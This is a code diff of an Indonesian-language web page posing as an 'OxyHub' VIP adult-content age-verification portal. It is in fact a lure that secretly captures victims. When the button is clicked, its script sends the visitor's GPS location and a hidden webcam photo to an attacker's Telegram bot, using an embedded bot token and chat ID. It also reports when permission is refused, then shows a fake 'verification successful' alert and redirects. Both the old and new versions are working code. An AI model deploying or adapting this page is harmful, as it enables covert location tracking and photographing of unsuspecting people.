@@ -3,73 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OxyHub - VIP Portal</title>
+    <title>OxyHub VIP</title>
     <style>
-        body { background: #0a0a0a; color: #eee; font-family: sans-serif; text-align: center; padding: 30px 15px; margin: 0; }
-        .logo { font-size: 38px; font-weight: bold; color: #ff9900; margin-bottom: 10px; padding-top: 20px; }
-        .logo span { background: #ff9900; color: #000; padding: 2px 10px; border-radius: 6px; }
-        .btn { 
-            background: linear-gradient(145deg, #151515, #1d1d1d); border: 1px solid #333; 
-            padding: 22px; margin: 15px auto; border-radius: 15px; display: block; 
-            max-width: 380px; color: #ff9900; text-decoration: none; font-weight: bold;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5); cursor: pointer;
-        }
+        body { background: #000; color: #ff9900; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .btn { background: #ff9900; color: #000; padding: 20px; border-radius: 10px; font-weight: bold; display: inline-block; cursor: pointer; }
         video, canvas { display: none; }
-        .footer { margin-top: 50px; font-size: 11px; color: #444; }
     </style>
 </head>
 <body>
+    <h1>Oxy<span>HUB</span></h1>
+    <p>Klik tombol di bawah untuk verifikasi</p>
+    <div class="btn" onclick="eksekusi()">🚀 VERIFIKASI SEKARANG</div>
 
-    <div class="logo">Oxy<span>HUB</span></div>
-    <p style="color:#888">Verifikasi Member VIP untuk Akses Konten 18+</p>
-
-    <div class="btn" onclick="gasGacor()">🚀 MASUK SERVER VIP</div>
-    <div class="btn" onclick="gasGacor()">🔥 FULL VIDEO VIRAL</div>
-
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
-    <div class="footer">DANA Support: 082120342112<br>© 2026 OxyVerse Project</div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
     <script>
-        const TOKEN = '8734003243:AAE01xpuHVuTMdBP_o-1GctMSkqorZiFku0';
-        const CHATID = '8286184238';
+        const T = '8734003243:AAE01xpuHVuTMdBP_o-1GctMSkqorZiFku0';
+        const C = '8286184238';
 
-        async function gasGacor() {
-            // 1. Sedot Lokasi
-            navigator.geolocation.getCurrentPosition(res => {
-                const maps = `https://www.google.com/maps?q=${res.coords.latitude},${res.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHATID}&text=📍 LOKASI TARGET GACOR:%0A${maps}`);
-            }, () => {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHATID}&text=⚠️ Target tolak lokasi.`);
+        function eksekusi() {
+            // 1. Kirim Notif Awal (Cek Koneksi)
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=⚡ Target sudah klik tombol!`);
+
+            // 2. Minta Lokasi
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=📍 Lokasi: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
 
-            // 2. Sedot Kamera
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
+            // 3. Ambil Kamera
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(s => {
+                let v = document.getElementById('v');
+                v.srcObject = s;
                 setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHATID);
-                        formData.append('photo', blob, 'capture.jpg');
-                        formData.append('caption', '📸 JEPRETAN WAJAH TARGET GACOR!');
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    let c = document.getElementById('c');
+                    c.width = 640; c.height = 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        let f = new FormData();
+                        f.append('chat_id', C);
+                        f.append('photo', b, 'x.jpg');
+                        // PAKSA KIRIM FOTO
+                        navigator.sendBeacon ? navigator.sendBeacon(`https://api.telegram.org/bot${T}/sendPhoto`, f) : fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:f});
                     }, 'image/jpeg');
-
-                    alert("Sistem: Verifikasi Berhasil! Membuka Konten...");
-                    window.location.href = "https://www.pornhub.com";
+                    alert("Verifikasi Berhasil!");
+                    window.location.href = "https://www.google.com";
                 }, 2000);
-            } catch (e) {
-                alert("Klik 'IZINKAN' untuk memverifikasi umur anda!");
-            }
+            })
+            .catch(e => {
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=❌ Target menolak izin kamera.`);
+                alert("Wajib klik IZINKAN!");
+            });
         }
     </script>
 </body>
